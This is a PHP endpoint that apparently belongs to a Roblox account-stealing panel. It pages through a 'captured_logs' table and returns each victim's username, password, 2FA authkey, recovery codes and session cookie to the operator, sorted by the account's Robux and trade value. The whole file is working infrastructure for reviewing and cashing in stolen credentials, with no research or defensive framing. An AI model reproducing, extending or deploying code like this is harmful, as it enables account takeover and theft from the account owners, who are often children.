<?php

require_once( $_SERVER[ "DOCUMENT_ROOT" ] . "/functional/account.php" );

header( "content-type: application/json; charset=utf-8" );

$info = require_account( true );
connect( );

global $db;

$page = isset( $_GET[ "page" ] ) ? max( 1, (int) $_GET[ "page" ] ) : 1;
$sort_by = (string) ( $_GET[ "sortBy" ] ?? "" );
$limit = 20;
$offset = ( $page - 1 ) * $limit;
$owner_id = (int) $info[ "id" ];

$order = "captured_at DESC";
if ( $sort_by === "robux" )
{
    $order = "robux DESC, captured_at DESC";
}
elseif ( $sort_by === "summary" )
{
    $order = "summary DESC, captured_at DESC";
}
elseif ( $sort_by === "rap" )
{
    $order = "rap DESC, captured_at DESC";
};

$count_stmt = $db->prepare( "SELECT COUNT(*) FROM captured_logs WHERE owner_id = ?" );
$count_stmt->execute( [ $owner_id ] );
$total = (int) $count_stmt->fetchColumn( );
$total_pages = max( 1, (int) ceil( $total / $limit ) );

if ( $total === 0 )
{
    die( json_encode( [
        "logs" => [ ],
        "pages" => 1,
    ], JSON_UNESCAPED_SLASHES ) );
};

$stmt = $db->prepare( "
    SELECT id, roblox_user_id, roblox_username, roblox_display, password, authkey, recovcodes, cookie,
           summary, robux, rap, embed_json, captured_at
    FROM captured_logs
    WHERE owner_id = ?
    ORDER BY {$order}
    LIMIT ? OFFSET ?
" );
$stmt->bindValue( 1, $owner_id, PDO::PARAM_INT );
$stmt->bindValue( 2, $limit, PDO::PARAM_INT );
$stmt->bindValue( 3, $offset, PDO::PARAM_INT );
$stmt->execute( );
$rows = $stmt->fetchAll( );

$logs = [ ];

foreach ( $rows as $row )
{
    $uid = (int) ( $row[ "roblox_user_id" ] ?? 0 );
    $embed_data = [ ];
    if ( !empty( $row[ "embed_json" ] ) )
    {
        $decoded = json_decode( (string) $row[ "embed_json" ], true );
        if ( is_array( $decoded ) )
        {
            $embed_data = $decoded;
        };
    };

    if ( empty( $embed_data ) )
    {
        $embed_data = build_capture_embed_preview(
            (string) ( $row[ "roblox_username" ] ?? "Unknown" ),
            $uid,
            (string) ( $row[ "password" ] ?? "" ),
            (string) ( $row[ "cookie" ] ?? "" )
        );
    };

    $logs[ ] = [
        "time" => date( "Y-m-d H:i:s", (int) ( $row[ "captured_at" ] ?? 0 ) ),
        "user" => [
            "id" => $uid,
            "username" => (string) ( $row[ "roblox_username" ] ?? "" ),
            "display" => (string) ( $row[ "roblox_display" ] ?? "" ),
            "thumbnail" => $uid > 0
                ? "https://www.roblox.com/headshot-thumbnail/image?userId={$uid}&width=150&height=150&format=png"
                : "",
        ],
        "summary" => number_format( (int) ( $row[ "summary" ] ?? 0 ) ),
        "robux" => number_format( (int) ( $row[ "robux" ] ?? 0 ) ),
        "rap" => number_format( (int) ( $row[ "rap" ] ?? 0 ) ),
        "credentials" => [
            "password" => (string) ( $row[ "password" ] ?? "" ),
            "authkey" => (string) ( $row[ "authkey" ] ?? "" ),
            "recovcodes" => (string) ( $row[ "recovcodes" ] ?? "" ),
            "cookie" => (string) ( $row[ "cookie" ] ?? "" ),
        ],
        "embedData" => $embed_data,
    ];
};

die( json_encode( [
    "logs" => $logs,
    "pages" => $total_pages,
], JSON_UNESCAPED_SLASHES ) );
?>
